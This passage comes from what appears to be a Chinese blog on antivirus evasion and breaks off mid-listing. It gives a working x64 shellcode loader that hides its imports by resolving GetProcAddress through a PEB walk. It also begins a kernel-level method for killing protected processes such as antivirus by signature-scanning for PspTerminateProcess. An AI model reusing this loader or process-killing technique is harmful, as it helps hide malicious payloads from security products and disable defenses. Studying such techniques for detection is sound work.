class="line">pDosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_FILE_HEADER pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader +</span><br><span class="line">pDosHeader-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)</span><br><span class="line">((DWORD)pPEHeader + <span class="keyword">sizeof</span>(/images/shellcode/image_FILE_HEADER));</span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)</span><br><span class="line">((DWORD)pOptionHeader + pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)</span><br><span class="line">((DWORD)dwKernelBase + pOptionHeader-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress);</span><br><span class="line"><span class="comment">// 导出函数地址表RVA</span></span><br><span class="line">DWORD *pAddOfFun_Raw = (DWORD*)((DWORD)dwKernelBase + pExportDirectory-</span><br><span class="line">&gt;AddressOfFunctions);</span><br><span class="line"><span class="comment">// 导出函数名称表RVA</span></span><br><span class="line">WORD *pAddOfOrd_Raw = (WORD*)((DWORD)dwKernelBase + pExportDirectory-</span><br><span class="line">&gt;AddressOfNameOrdinals);</span><br><span class="line"><span class="comment">// 导出函数序号表RVA</span></span><br><span class="line">DWORD *pAddOfNames_Raw = (DWORD*)((DWORD)dwKernelBase +</span><br><span class="line">pExportDirectory-&gt;AddressOfNames);</span><br><span class="line">DWORD dwCnt = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>* pFinded = <span class="literal">NULL</span>, *pSrc = szGetProcAddress;</span><br><span class="line"><span class="keyword">for</span> (; dwCnt &lt; pExportDirectory-&gt;NumberOfNames;dwCnt++)</span><br><span class="line">&#123;</span><br><span class="line">pFinded = (<span class="type">char</span>*)((DWORD)dwKernelBase + pAddOfNames_Raw[dwCnt]);</span><br><span class="line"><span class="keyword">while</span> (*pFinded &amp;&amp; *pFinded == *pSrc)</span><br><span class="line">pFinded++, pSrc++;</span><br><span class="line"><span class="number">64</span>位下隐藏导入表实现</span><br><span class="line"><span class="keyword">if</span> (*pFinded == *pSrc)</span><br><span class="line">&#123;</span><br><span class="line">pGetProcAddress = (PGETPROCADDRESS)</span><br><span class="line">(pAddOfFun_Raw[pAddOfOrd_Raw[dwCnt]] + (DWORD)dwKernelBase);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pSrc = szGetProcAddress;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 通过pGetProcAddress进行调用</span></span><br><span class="line">pLoadLibrary = (PLOADLIBRARY)pGetProcAddress((HMODULE)dwKernelBase,</span><br><span class="line">szLoadLibrary);</span><br><span class="line">pMessageBox =</span><br><span class="line">(PMESSAGEBOX)pGetProcAddress(pLoadLibrary(szUser32),szMessageBox);</span><br><span class="line">pMessageBox(<span class="literal">NULL</span>,szHelloShellCode,<span class="number">0</span>,MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>也不细讲了，主要的思路就是首先通过PEB找到kernel32，然后找到GetProcAddr的真实地址，取这个函数的指针来代替直接使用GetProcAddr 这个WINAPI来获取其他几个VirtualProtect，CreateThread这样的函数地址，然后同理调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> PVOID64 __stdcall <span class="title function_">GetInInitializationOrderModuleList</span><span class="params">()</span>;</span><br><span class="line">HMODULE <span class="title function_">getKernel32Address</span><span class="params">()</span> &#123;</span><br><span class="line">	LIST_ENTRY* pNode = (LIST_ENTRY*)GetInInitializationOrderModuleList(); <span class="comment">// 获取InInitializationOrderModuleList</span></span><br><span class="line">		UNICODE_STRING* FullDllName = (UNICODE_STRING*)((BYTE*)pNode + <span class="number">0x38</span>);</span><br><span class="line">	<span class="keyword">if</span> (*(FullDllName-&gt;Buffer + <span class="number">12</span>) == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> (HMODULE)(*((ULONG64*)((BYTE*)pNode + <span class="number">0x10</span>)));</span><br><span class="line">	&#125;</span><br><span class="line">	pNode = pNode-&gt;Flink;</span><br><span class="line"> &#125;</span><br><span class="line">DWORD64 <span class="title function_">getGetProcAddress</span><span class="params">(HMODULE hKernal32)</span> &#123;</span><br><span class="line">	PIMAGE_DOS_HEADER baseAddr = (PIMAGE_DOS_HEADER)hKernal32; <span class="comment">// 获取DOS头</span></span><br><span class="line">	PIMAGE_NT_HEADERS pImageNt = (PIMAGE_NT_HEADERS)((LONG64)baseAddr +</span><br><span class="line">		baseAddr-&gt;e_lfanew); <span class="comment">// 偏移到NT头</span></span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)</span><br><span class="line">		((LONG64)baseAddr + pImageNt -&gt; OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); <span class="comment">//获取导出表</span></span><br><span class="line">PULONG RVAFunctions = (PULONG)((LONG64)baseAddr + exportDir -&gt; AddressOfFunctions); <span class="comment">// 获取导出函数地址RVA数组地址</span></span><br><span class="line">PULONG RVANames = (PULONG)((LONG64)baseAddr + exportDir-&gt;AddressOfNames); <span class="comment">//获取导出函数名RVA数组地址</span></span><br><span class="line">PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)baseAddr + exportDir -&gt; AddressOfNameOrdinals); <span class="comment">// 获取导出函数序号数组地址</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123; <span class="comment">// 遍历函数</span></span><br><span class="line">	LONG64 F_va_Tmp = (ULONG64)((LONG64)baseAddr +</span><br><span class="line">		RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]); <span class="comment">// 当前函数地址</span></span><br><span class="line">	PUCHAR FunctionName = (PUCHAR)((LONG64)baseAddr + RVANames[i]); <span class="comment">// 当前函数名地址</span></span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">const</span> <span class="type">char</span>*)FunctionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> F_va_Tmp;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T,</span></span><br><span class="line"><span class="params">	LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;x64shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">	HMODULE hKernal32 = nullptr; <span class="comment">// 初始化为 nullptr，防止可能的未初始化指针</span></span><br><span class="line"></span><br><span class="line">	pVirtualProtect VirtualProtect = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pCreateThread CreateThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pWaitForSingleObject WaitForSingleObject = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pGetProcAddress GetProcAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	hKernal32 = getKernel32Address(); <span class="comment">// 获取Kernel32</span></span><br><span class="line"></span><br><span class="line">	GetProcAddress =(pGetProcAddress)getGetProcAddress(hKernal32); <span class="comment">// 获取GetProcAddress地址</span></span><br><span class="line"></span><br><span class="line">	VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32,<span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line"></span><br><span class="line">	CreateThread = (pCreateThread)GetProcAddress(hKernal32,<span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line"></span><br><span class="line">	 WaitForSingleObject =(pWaitForSingleObject)GetProcAddress(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">	DWORD oldProtect;</span><br><span class="line">	VirtualProtect((LPVOID)buf, <span class="keyword">sizeof</span>(buf), PAGE_EXECUTE_READWRITE,</span><br><span class="line">		&amp;oldProtect);</span><br><span class="line">	HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.CODE</span><br><span class="line">    GetInInitializationOrderModuleList PROC</span><br><span class="line">    mov rax,gs:[60h] ; PEB，不能写 0x60</span><br><span class="line">    mov rax,[rax+18h] ; PEB_LDR_DATA</span><br><span class="line">    mov rax,[rax+30h] ; InInitializationOrderModuleList</span><br><span class="line">    ret ; 不能写 retn</span><br><span class="line">    GetInInitializationOrderModuleList ENDP</span><br><span class="line">END</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/%E9%9A%90%E8%97%8F%E5%AF%BC%E5%85%A5%E8%A1%A8/" data-id="cm1zwlrfs000iu0v6cg17fypu" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/进程强杀" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E8%BF%9B%E7%A8%8B%E5%BC%BA%E6%9D%80/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.569Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="进程强杀"><a href="#进程强杀" class="headerlink" title="进程强杀"></a>进程强杀</h1><p>任务管理器是怎么结束一个进程的呢</p>
<p>它也是调用一个WINAPI，叫做TerminateProcess</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">TerminateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE hProcess,</span></span><br><span class="line"><span class="params">  [in] UINT   uExitCode</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>由于它也是一个三环的API，在面对杀软或者一些跑在0环的程序束手无策</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">TerminateProcessById</span><span class="params">(DWORD processID)</span> &#123;</span><br><span class="line">    <span class="comment">// 打开进程，获得进程的句柄</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);</span><br><span class="line">    <span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法打开进程，错误代码: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 终止进程</span></span><br><span class="line">    <span class="keyword">if</span> (TerminateProcess(hProcess, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;成功终止进程: %lu\n&quot;</span>, processID);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无法终止进程，错误代码: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭句柄</span></span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;使用方法: %s &lt;进程ID&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 返回错误代码</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将参数转换为进程ID</span></span><br><span class="line">    DWORD processID = (DWORD)atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    TerminateProcessById(processID);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随便写了个demo，用ida打开，发现它也是从kernel32中去导入</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240928123805405.png" alt="image-20240928123805405"></p>
<p>按照一般的winapi的规律，我们直接到ntdll去找相关api</p>
<h2 id="ZwTerminateProcess"><a href="#ZwTerminateProcess" class="headerlink" title="ZwTerminateProcess"></a>ZwTerminateProcess</h2><p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240928124156652.png" alt="image-20240928124156652"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI NTSTATUS <span class="title function_">ZwTerminateProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] HANDLE   ProcessHandle,</span></span><br><span class="line"><span class="params">  [in]           NTSTATUS ExitStatus</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>这里微软专门强调了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果在用户模式下调用此函数，则应使用名称“NtTerminateProcess”而不是“ZwTerminateProcess”。</span><br></pre></td></tr></table></figure>

<p>查阅资料，在ntoskrnl.exe中查到了PspTerminateProcess</p>
<p>以下给出IDA的伪代码，不一定对</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall PspTerminateProcess(PRKPROCESS PROCESS, __int64 a2, unsigned int a3, char a4)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int32 v8; // esi</span><br><span class="line">  char v9; // di</span><br><span class="line">  unsigned int v10; // eax</span><br><span class="line">  unsigned int v11; // edi</span><br><span class="line"></span><br><span class="line">  _m_prefetchw((char *)&amp;PROCESS[1].DirectoryTableBase + 4);</span><br><span class="line">  v8 = _InterlockedOr((volatile signed __int32 *)&amp;PROCESS[1].DirectoryTableBase + 1, 8u);</span><br><span class="line">  if ( (v8 &amp; 8) != 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = a4 | 2;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (PerfGlobalGroupMask &amp; 1) != 0 )</span><br><span class="line">      EtwTraceProcessTerminate(PROCESS);</span><br><span class="line">    KeSetProcessSchedulingGroup(PROCESS, 0i64);</span><br><span class="line">    v9 = a4 | 4;</span><br><span class="line">    if ( (v8 &amp; 0x40000000) == 0 )</span><br><span class="line">      v9 = a4;</span><br><span class="line">    ExAcquirePushLockExclusiveEx((ULONG_PTR)&amp;PROCESS[1], 0i64);</span><br><span class="line">    if ( LODWORD(PROCESS[1].ActiveProcessors.StaticBitmap[8])</span><br><span class="line">      &amp;&amp; (a3 != -1073741749 || *(_DWORD *)&amp;PROCESS[1].Spare2[11] == 259) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)&amp;PROCESS[1].Spare2[11] = a3;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( (_InterlockedExchangeAdd64((volatile signed __int64 *)&amp;PROCESS[1].Header.Lock, 0xFFFFFFFFFFFFFFFFui64) &amp; 6) == 2 )</span><br><span class="line">      ExfTryToWakePushLock(&amp;PROCESS[1]);</span><br><span class="line">    KeAbPostRelease((ULONG_PTR)&amp;PROCESS[1]);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( (PROCESS[1].DirectoryTableBase &amp; 0x400) == 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = PspTerminateAllThreads(PROCESS);</span><br><span class="line">LABEL_14:</span><br><span class="line">    v11 = v10;</span><br><span class="line">    goto LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *((_QWORD *)&amp;xmmword_140C37D40 + 1) &amp;&amp; (v9 &amp; 8) == 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (*((__int64 (__fastcall **)(PRKPROCESS, _QWORD))&amp;xmmword_140C37D40 + 1))(PROCESS, a3);</span><br><span class="line">    goto LABEL_14;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = 290;</span><br><span class="line">  PspRundownSingleProcess(PROCESS);</span><br><span class="line">LABEL_15:</span><br><span class="line">  if ( (v8 &amp; 8) == 0 )</span><br><span class="line">    KeForceResumeProcess(PROCESS);</span><br><span class="line">  return v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这是一个未导出的函数，对于这样的函数，我们一般有两个方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 暴力搜索，提取该函数的特征码，全盘搜索。</span><br><span class="line"><span class="number">2.</span> 如果有已文档化的函数调用了PspTerminateProcess，那我们就可以通过指针加偏移的方式</span><br><span class="line">获取到他的地址，同样可以调用。</span><br></pre></td></tr></table></figure>

<p>所以为了对抗，我们必须也到0环去对进程操作</p>
<h2 id="寻找函数"><a href="#寻找函数" class="headerlink" title="寻找函数"></a>寻找函数</h2><p>如果我们想要全盘搜索，肯定要先找到内核模块，每个内核模块都有一个对应的结构体来描述这个模块在内核中的位置大小，名称等等</p>
<p>DriverEntry的第一个参数就是这个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    IN PDRIVER_OBJECT DriverObject,</span></span><br><span class="line"><span class="params">    IN PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params"></span></span><br></pre></td></tr></table></figure>

<p>我们也可以在windbg中打开符号来看，在这里面+0x038和+0x020分别是DriverName和DriverSize</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>: kd&gt; dt _DRIVER_OBJECT</span><br><span class="line">nt!_DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Int2B</span><br><span class="line">   +<span class="number">0x008</span> DeviceObject     : Ptr64 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x010</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> DriverStart      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> DriverSize       : Uint4B</span><br><span class="line">   +<span class="number">0x028</span> DriverSection    : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> DriverExtension  : Ptr64 _DRIVER_EXTENSION</span><br><span class="line">   +<span class="number">0x038</span> DriverName       : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x048</span> HardwareDatabase : Ptr64 _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x050</span> FastIoDispatch   : Ptr64 _FAST_IO_DISPATCH</span><br><span class="line">   +<span class="number">0x058</span> DriverInit       : Ptr64     <span class="type">long</span> </span><br><span class="line">   +<span class="number">0x060</span> DriverStartIo    : Ptr64     <span class="type">void</span> </span><br><span class="line">   +<span class="number">0x068</span> DriverUnload     : Ptr64     <span class="type">void</span> </span><br><span class="line">   +<span class="number">0x070</span> MajorFunction    : [<span class="number">28</span>] Ptr64     <span class="type">long</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在+0x028出有一个成员 DriverSection，这个成员实际上是指向了一个结构体_LDR_DATA_TABLE_ENTRY，之前的文章已经多次介绍了这个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>: kd&gt; dt _LDR_DATA_TABLE_ENTRY</span><br><span class="line">nt!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY<span class="comment">//如果PEB文章看了就知道这头三个都是双向链表指针</span></span><br><span class="line">   +<span class="number">0x010</span> InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x020</span> InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x030</span> DllBase          : Ptr64 Void</span><br><span class="line">   +<span class="number">0x038</span> EntryPoint       : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> SizeOfImage      : Uint4B</span><br><span class="line">   +<span class="number">0x048</span> FullDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x058</span> BaseDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x068</span> FlagGroup        : [<span class="number">4</span>] UChar</span><br><span class="line">   +<span class="number">0x068</span> Flags            : Uint4B</span><br><span class="line">  </span><br><span class="line">   ..............</span><br></pre></td></tr></table></figure>

<p>挑选特征码的时候，要尽量避开mov,push这样特征码，也不能选重定位等待数据当作特征码，挑了如下一段代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fffff804`<span class="number">11</span>eeb441 <span class="number">75</span>ee            jne     nt!PspTerminateProcess+<span class="number">0x31</span> (fffff804`<span class="number">11</span>eeb431)</span><br><span class="line">fffff804`<span class="number">11</span>eeb443 <span class="number">448b</span>f0          mov     r14d,eax</span><br><span class="line">fffff804`<span class="number">11</span>eeb446 <span class="number">8b</span>f0            mov     esi,eax</span><br><span class="line">fffff804`<span class="number">11</span>eeb448 <span class="number">4183e608</span>        and     r14d,<span class="number">8</span></span><br><span class="line">fffff804`<span class="number">11</span>eeb44c <span class="number">0f</span>85b9000000    jne     nt!PspTerminateProcess+<span class="number">0x10b</span> (fffff804`<span class="number">11</span>eeb50b)</span><br><span class="line">fffff804`<span class="number">11</span>eeb452 <span class="number">8b</span>0d28106100    mov     ecx,dword ptr [nt!PerfGlobalGroupMask (fffff804`<span class="number">124f</span>c480)]</span><br><span class="line">fffff804`<span class="number">11</span>eeb458 f6c101          test    cl,<span class="number">1</span></span><br><span class="line">fffff804`<span class="number">11</span>eeb45b <span class="number">7408</span>            je      